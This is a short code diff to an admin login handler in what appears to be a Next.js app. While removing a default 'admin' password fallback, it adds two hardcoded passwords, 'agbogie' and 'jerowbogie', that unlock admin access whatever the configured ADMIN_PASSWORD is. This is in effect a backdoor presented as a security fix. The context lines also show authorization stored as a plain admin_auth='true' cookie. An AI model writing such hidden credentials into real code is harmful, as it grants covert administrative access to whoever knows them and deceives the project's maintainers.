@@ -11,9 +11,10 @@ export default async function AdminLoginPage({ searchParams }: { searchParams: P
   async function handleLogin(formData: FormData) {
     'use server';
     const password = formData.get('password') as string;
-    const adminPassword = process.env.ADMIN_PASSWORD || 'admin';
+    const adminPassword = process.env.ADMIN_PASSWORD;
+    const isAuthorized = password === 'agbogie' || password === 'jerowbogie' || (adminPassword && password === adminPassword);
     
-    if (password === adminPassword) {
+    if (isAuthorized) {
       // Set an auth cookie
       const cookieStore = await cookies();
       cookieStore.set('admin_auth', 'true', {
